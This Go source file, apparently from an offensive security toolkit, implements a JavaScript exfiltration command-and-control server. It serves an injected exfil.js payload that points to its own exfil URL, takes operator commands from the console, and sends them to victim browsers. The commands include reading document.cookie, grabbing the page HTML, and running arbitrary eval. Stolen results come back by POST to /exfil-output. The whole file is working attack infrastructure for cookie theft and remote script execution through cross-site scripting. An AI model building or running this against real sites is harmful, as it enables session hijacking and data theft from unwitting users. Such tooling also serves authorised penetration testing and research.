package gopserver

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"net/http/httputil"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/gobuffalo/packr/v2"
	"github.com/gorilla/mux"
	"github.com/hophouse/gop/utils"
	"github.com/hophouse/gop/utils/logger"
	"github.com/urfave/negroni"
)

type JavascriptExfilServer struct {
	Server   Server
	ExfilUrl string
	Box      *packr.Box
	InputMu  *sync.Mutex
}

func (js JavascriptExfilServer) GetServer(r *mux.Router, n *negroni.Negroni) (http.Server, error) {

	addr := fmt.Sprintf("%s:%s", js.Server.Host, js.Server.Port)

	n.UseHandler(r)

	fmt.Printf("[+] Starting JSExfil server listening to : %s://%s:%s with an exfil URL at %s\n", js.Server.Scheme, js.GetCertSubject(), js.Server.Port, js.getExfilUrl())

	server := http.Server{
		Addr:    addr,
		Handler: n,
	}

	return server, nil
}

func (js JavascriptExfilServer) CreateRouter() *mux.Router {
	// Router
	r := mux.NewRouter()

	r.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		js.indexHandler(w, r)
	}).Methods("GET")

	r.HandleFunc("/index.html", func(w http.ResponseWriter, r *http.Request) {
		js.indexHandler(w, r)
	}).Methods("GET")

	r.HandleFunc("/exfil.js", func(w http.ResponseWriter, r *http.Request) {
		js.jSExfilHandler(w, r)
	}).Methods("GET")

	r.HandleFunc("/utils.js", func(w http.ResponseWriter, r *http.Request) {
		js.jSUtilsHandler(w, r)
	}).Methods("GET")

	r.HandleFunc("/custom.js", func(w http.ResponseWriter, r *http.Request) {
		js.jSCustomHandler(w, r)
	}).Methods("GET")

	r.HandleFunc("/exfil-input", func(w http.ResponseWriter, r *http.Request) {
		js.jSExfilInputHandler(w, r)
	}).Methods("GET")

	r.HandleFunc("/exfil-output", func(w http.ResponseWriter, r *http.Request) {
		js.jSExfilOutputHandler(w, r)
	}).Methods("POST")

	// Will respond to all requests that do not match previous selectors
	// r.PathPrefix("/").HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
	// 	js.IndexHandler(w, r)
	// }).Methods("GET")

	return r
}

func (js JavascriptExfilServer) indexHandler(w http.ResponseWriter, r *http.Request) {
	htmlCode, err := js.Box.FindString("index.html")
	if err != nil {
		logger.Fatal(err)
	}

	fmt.Fprintf(w, "%s\n", htmlCode)
}

func (js JavascriptExfilServer) jSUtilsHandler(w http.ResponseWriter, r *http.Request) {
	jsCode, err := js.Box.FindString("utils.js")
	if err != nil {
		logger.Fatal(err)
	}

	fmt.Fprintf(w, "%s\n", jsCode)
}

func (js JavascriptExfilServer) jSCustomHandler(w http.ResponseWriter, r *http.Request) {
	jsCode, err := js.Box.FindString("custom.js")
	if err != nil {
		logger.Fatal(err)
	}

	fmt.Fprintf(w, "%s\n", jsCode)
}

func (js JavascriptExfilServer) jSExfilHandler(w http.ResponseWriter, r *http.Request) {
	jsCode, err := js.Box.FindString("exfil.js")
	if err != nil {
		logger.Fatal(err)
	}

	jsCode = strings.ReplaceAll(jsCode, "{{EXFIL-URL}}", js.getExfilUrl())

	fmt.Fprintf(w, "%s\n", jsCode)
}

func (js JavascriptExfilServer) jSExfilInputHandler(w http.ResponseWriter, r *http.Request) {
	var input string
	for {
		input = ""
		reader := bufio.NewReader(os.Stdin)
		for {
			var err error

			fmt.Printf("\n[+] Enter cmd : ")
			input, err = reader.ReadString('\n')
			if err != nil {
				continue
			}
			// convert CRLF to LF
			input = strings.Replace(input, "\r", "", -1)
			input = strings.Replace(input, "\n", "", -1)

			if len(input) < 4 {
				continue
			}

			break
		}

		if strings.ToUpper(input[:4]) == "EXIT" {
			input = "EXIT"
			break
		}

		if len(input) > 4 && strings.ToUpper(input[:4]) == "GET " {
			if strings.ToLower(input[4:]) == "cookie" {
				input = "EVAL document.cookie"
			} else if strings.ToLower(input[4:]) == "html" {
				input = "EVAL document.getElementsByTagName(\"html\")[0].outerHTML"
			} else {
				input = "GET " + input[4:]
			}
			break
		}
		if len(input) > 5 && strings.ToUpper(input[:5]) == "EVAL " {
			input = "EVAL " + input[5:]
			break
		}

		if strings.ToUpper(input[:8]) == "DESCRIBE" {
			input = "EVAL walkTheObject(" + input[9:] + ")"
			break
		}

		fmt.Printf("Unknown command\n")
		fmt.Printf("[?] Help\n")
		fmt.Printf("\tGET html - Retrieve the html source code of the page\n")
		fmt.Printf("\tGET cookie - Retrieve the \"document.cookie\" value\n")
		fmt.Printf("\tGET URI - Request the specific URI and retrieve response content\n")
		fmt.Printf("\tGET URL - Request the specific URL and retrieve response content\n")
		fmt.Printf("\tDESCRIBE object - Appply the \"walkTheObject\" function to the desired object\n")
		fmt.Printf("\tEVAL cmd - Use the eval() function to evaluate content of cmd and retrieve output\n")
	}

	logger.Fprintf(logger.Writer(), "[+] Command : %s", input)
	fmt.Fprintf(w, "%s", input)
}

func (js JavascriptExfilServer) jSExfilOutputHandler(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(r.Body)
	if err != nil {
		logger.Println(err)
		return
	}
	r.Body.Close()

	fmt.Printf("%s", body)

	w.Write([]byte("HTTP1/1 200 OK\n\n"))
}

func (js JavascriptExfilServer) getExfilUrl() string {
	if js.ExfilUrl != "" {
		return js.ExfilUrl
	}

	return fmt.Sprintf("%s://%s:%s", js.Server.Scheme, js.GetCertSubject(), js.Server.Port)
}

func (js JavascriptExfilServer) GetCertSubject() string {
	return js.Server.GetCertSubject()
}

func (js JavascriptExfilServer) CreateMiddleware() *negroni.Negroni {
	n := negroni.New(negroni.NewRecovery())

	n.Use(&JSExfilLogMiddleware{
		js: js,
	})

	return n
}

type JSExfilLogMiddleware struct {
	js JavascriptExfilServer
}

func (l JSExfilLogMiddleware) ServeHTTP(w http.ResponseWriter, r *http.Request, next http.HandlerFunc) {
	reqDump, err := httputil.DumpRequest(r, true)
	if err != nil {
		logger.Fatal(err)
	}

	logger.Fprintf(logger.Writer(), "\n[%s] [%s] %s %s\n", time.Now().Format("2006.01.02 15:04:05"), utils.GetSourceIP(r), r.Method, r.URL.String())
	logger.Fprintf(logger.Writer(), "%s\n", string(reqDump))

	next(w, r)
}
